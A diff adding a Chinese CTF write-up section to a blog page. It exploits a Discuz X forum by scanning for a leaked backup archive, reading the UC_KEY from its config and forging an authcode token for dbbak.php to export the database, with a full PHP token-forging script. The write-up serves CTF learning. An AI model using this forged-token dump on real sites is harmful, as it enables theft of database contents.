@@ -273,6 +273,7 @@
         <li><a href="#ez_bottle">ez_bottle</a></li>
         <li><a href="#php_jail_is_my_cry">php_jail_is_my_cry</a></li>
         <li><a href="#your-uns3r">Your Uns3r</a></li>
+        <li><a href="#我曾有一份工作复现">我曾有一份工作（复现）</a></li>
       </ol>
     </li>
     <li><a href="#misc">misc</a>
@@ -362,7 +363,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 7 分钟
+                    阅读时长: 9 分钟
                 </time>
             </div>
         
@@ -1094,6 +1095,321 @@
 		data-flex-basis="656px"
 	
 ></p>
+<h3 id="我曾有一份工作复现">我曾有一份工作（复现）
+</h3><blockquote>
+<p>一次备份，换来的是一张辞职信</p>
+<p>flag 在 <code>pre_a_flag</code> 表里</p>
+<p>本题允许使用扫描器</p>
+</blockquote>
+<p>先目录扫描</p>
+<p>下面将使用 <code>dirsearch</code> 进行扫描，通过备份一词猜测会有个 Tar 或者 Zip 之类的档案包。</p>
+<p>由于 Discuz 会在不存在的界面返回 index.php 的内容，为了减少搜索成功结果，将会在 <code>dirsearch</code> 时过滤掉字符串 <code>&lt;title&gt;论坛 -  Powered by Discuz!&lt;/title&gt;</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dirsearch -u ip --exclude-text<span class="o">=</span><span class="s2">&#34;&lt;title&gt;论坛 -  Powered by Discuz!&lt;/title&gt;&#34;</span> -e php,html,htm,zip,tar,gz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025lilctfwp/image-20250818203840125.png"
+	width="1483"
+	height="762"
+	srcset="/p/2025lilctfwp/image-20250818203840125_hu2708359337814210144.png 480w, /p/2025lilctfwp/image-20250818203840125_hu10096388208550930930.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250818203840125"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="467px"
+	
+></p>
+<p>下载www.zip,拿到源码，这个cms是Discuz X系列的</p>
+<p>先看看config目录下有没有敏感信息之类的</p>
+<p>config_global.php下有authkey</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$_config</span><span class="p">[</span><span class="s1">&#39;security&#39;</span><span class="p">][</span><span class="s1">&#39;authkey&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;c1e02a82142e896f2a8c0827687e2069Cg5sprDVlAfUhNjS2Xqelo9mJcfnSWY0&#39;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后config_ucenter.php下有一个UC_key</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;UC_KEY&#39;</span><span class="p">,</span> <span class="s1">&#39;N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接google相关漏洞</p>
+<p><img src="/p/2025lilctfwp/image-20250818204848167.png"
+	width="1371"
+	height="867"
+	srcset="/p/2025lilctfwp/image-20250818204848167_hu2594939184325413366.png 480w, /p/2025lilctfwp/image-20250818204848167_hu4968884007625985040.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250818204848167"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="158"
+		data-flex-basis="379px"
+	
+></p>
+<p>漏洞大概跟authcode函数有关，直接搜索相关代码</p>
+<p><img src="/p/2025lilctfwp/image-20250818205232191.png"
+	width="367"
+	height="940"
+	srcset="/p/2025lilctfwp/image-20250818205232191_hu17327018109154128080.png 480w, /p/2025lilctfwp/image-20250818205232191_hu6097600151889221158.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250818205232191"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="39"
+		data-flex-basis="93px"
+	
+></p>
+<p>这里的dbbak.php非常可疑，像是数据库备份源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">parse_str</span><span class="p">(</span><span class="nx">_authcode</span><span class="p">(</span><span class="nv">$code</span><span class="p">,</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">,</span> <span class="nx">UC_KEY</span><span class="p">),</span> <span class="nv">$get</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$get</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Invalid Request&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$timestamp</span> <span class="o">=</span> <span class="nx">time</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$timestamp</span> <span class="o">-</span> <span class="nv">$get</span><span class="p">[</span><span class="s1">&#39;time&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">3600</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Authorization has expired&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$get</span><span class="p">[</span><span class="s1">&#39;time&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$timestamp</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到这里用了UC_KEY,而且有时间校验1小时</p>
+<p>往下看代码可以看到有关export的方法，能够查询数据库里面的数据</p>
+<p><img src="/p/2025lilctfwp/image-20250818205944634.png"
+	width="1197"
+	height="710"
+	srcset="/p/2025lilctfwp/image-20250818205944634_hu5953821313521105039.png 480w, /p/2025lilctfwp/image-20250818205944634_hu17859186162886560195.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250818205944634"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="168"
+		data-flex-basis="404px"
+	
+></p>
+<p>要判断apptype我们查找一下定义</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$code</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$apptype</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;apptype&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$apptype</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$apptype</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到要get传参数，这里我们的cms是Discuz X，所以apptype应该是discuzx</p>
+<p>接下来就是利用authcode的逻辑，让method=export</p>
+<p><img src="/p/2025lilctfwp/image-20250818210717789.png"
+	width="1298"
+	height="791"
+	srcset="/p/2025lilctfwp/image-20250818210717789_hu11513725207779230593.png 480w, /p/2025lilctfwp/image-20250818210717789_hu2588725305940029967.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250818210717789"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="164"
+		data-flex-basis="393px"
+	
+></p>
+<p>这里直接改一下代码就行了，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">_authcode</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$operation</span> <span class="o">=</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">,</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$ckey_length</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$key</span> <span class="o">?</span> <span class="nv">$key</span> <span class="o">:</span> <span class="nx">UC_KEY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$keya</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$keyb</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$keyc</span> <span class="o">=</span> <span class="nv">$ckey_length</span> <span class="o">?</span> <span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">)</span><span class="o">:</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">microtime</span><span class="p">()),</span> <span class="o">-</span><span class="nv">$ckey_length</span><span class="p">))</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$cryptkey</span> <span class="o">=</span> <span class="nv">$keya</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$keya</span><span class="o">.</span><span class="nv">$keyc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$key_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$string</span> <span class="o">=</span> <span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">))</span> <span class="o">:</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s1">&#39;%010d&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">?</span> <span class="nv">$expiry</span> <span class="o">+</span> <span class="nx">time</span><span class="p">()</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$string</span><span class="o">.</span><span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="nv">$string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$string_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$box</span> <span class="o">=</span> <span class="nx">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$rndkey</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nv">$key_length</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$string_length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$a</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$result</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$string</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="nv">$box</span><span class="p">[(</span><span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(((</span><span class="nx">int</span><span class="p">)</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="nx">time</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">===</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">)</span><span class="o">.</span><span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="mi">26</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$keyc</span><span class="o">.</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$UC_KEY</span> <span class="o">=</span> <span class="s1">&#39;N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$params</span> <span class="o">=</span> <span class="s2">&#34;time=&#34;</span><span class="o">.</span><span class="nx">time</span><span class="p">()</span><span class="o">.</span><span class="s2">&#34;&amp;method=export&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$code</span> <span class="o">=</span> <span class="nx">_authcode</span><span class="p">(</span><span class="nv">$params</span><span class="p">,</span> <span class="s1">&#39;ENCODE&#39;</span><span class="p">,</span> <span class="nv">$UC_KEY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$code</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">parse_str</span><span class="p">(</span><span class="nx">_authcode</span><span class="p">(</span><span class="nv">$code</span><span class="p">,</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">,</span> <span class="nv">$UC_KEY</span><span class="p">),</span> <span class="nv">$get</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$get</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后拿生成的code去请求</p>
+<p><img src="/p/2025lilctfwp/image-20250818211301651.png"
+	width="1451"
+	height="833"
+	srcset="/p/2025lilctfwp/image-20250818211301651_hu5112970961069721727.png 480w, /p/2025lilctfwp/image-20250818211301651_hu17480901471513459691.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250818211301651"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="174"
+		data-flex-basis="418px"
+	
+></p>
+<p>得到一个可以直接访问的sql文件</p>
+<p><img src="/p/2025lilctfwp/image-20250818211503402.png"
+	width="1479"
+	height="819"
+	srcset="/p/2025lilctfwp/image-20250818211503402_hu3954011947202464805.png 480w, /p/2025lilctfwp/image-20250818211503402_hu1144966270624822417.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250818211503402"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="180"
+		data-flex-basis="433px"
+	
+></p>
+<p>16进制转换得到flag</p>
 <h2 id="misc">misc
 </h2><h3 id="是谁没有阅读参赛须知">是谁没有阅读参赛须知？
 </h3><p><img src="/p/2025lilctfwp/image-20250815134657612.png"
